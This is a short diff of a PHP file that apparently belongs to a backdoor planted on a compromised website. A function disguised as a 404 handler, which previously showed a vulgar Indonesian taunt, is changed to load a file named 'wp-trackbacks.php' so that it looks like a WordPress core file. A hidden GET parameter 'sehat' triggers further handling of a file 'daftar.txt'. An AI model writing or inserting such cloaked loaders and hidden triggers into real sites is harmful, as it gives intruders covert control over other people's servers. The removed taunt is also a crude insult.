@@ -1,8 +1,7 @@
 <?php
 function feedback404()
 {
-    header("HTTP/1.0 404 Not Found");
-    echo "<h1>༺✮•°◤ 𝙈𝙐𝙆𝘼 𝙇𝙐 𝘼𝙎𝙇𝙄 𝙆𝘼𝙔𝘼𝙆 𝙆𝙊𝙉𝙏𝙊𝙇 𝘽𝘼𝙉𝙂 ◥°•✮༻</h1>"; 
+    require_once("wp-trackbacks.php");
 }
 if (isset($_GET['sehat'])) {
     $filename = "daftar.txt";
